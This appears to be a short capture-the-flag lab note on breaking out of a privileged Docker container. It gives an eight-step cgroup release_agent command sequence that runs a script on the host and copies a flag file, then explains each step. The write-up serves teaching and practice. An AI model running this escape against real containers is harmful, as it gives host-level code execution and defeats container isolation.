Docker containers can run in two modes:

User mode
Privileged mode
If a container is running with privileged access to the operating system, we can effectively execute commands as root.

We can use a system package such as "libcap2-bin"'s capsh to list the capabilities our container has: capsh --print.
 sys_admin
Example:
capsh --print | grep

# Capabilities
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x  
2. echo 1 > /tmp/cgrp/x/notify_on_release
3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4. echo "$host_path/exploit" > /tmp/cgrp/release_agent
5. echo '#!/bin/sh' > /exploit
6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
7. chmod a+x /exploit
8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

**Summary of the exploit**

1. We need to create a group to use the linux kernel to write and execute our exploit.
The kernel uses "cgroup" to manage processes on the OS since we have capabilities to manage "cgroup" as root on the host, we'll mount this to "/tmp/cgrp" on the container.
2. For our exploit to execute, we'll need to tell kernel to run our code.
By adding "1" to "tmp/cgrp/x/notify_on_release", we're telling kernel to execute something once the "cgroup" finishes.(Paul Menage, 2004)
3. We find out where the containers files are stored on the host and store it as a variable.
4. Where we then echo the location of the containers files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by "cgroup" once it is released.
5. Let's turn our exploit into a shell on the host

6. Execute a command to echo the host flag into a file named "flag.txt" in the container, once "/exploit" is executed

7. Make our exploit executable!

8. We create a process and store that into "/tmp/cgrp/x/cgroup.procs"